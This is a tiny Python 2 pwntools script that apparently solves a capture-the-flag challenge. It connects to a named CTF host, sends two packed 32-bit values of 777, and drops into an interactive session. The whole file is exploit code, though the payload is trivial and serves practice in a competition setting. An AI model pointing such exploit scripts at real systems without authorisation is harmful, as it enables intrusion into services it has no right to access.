#!/usr/bin/env python2
from pwn import *


host , port = 'ctf.yuawn.idv.tw' , 10101
#host , port = '192.168.78.251' , 4000
y = remote( host , port )

sleep(1)
p = p32(777)
p += p32(777)
y.send(p)

y.interactive()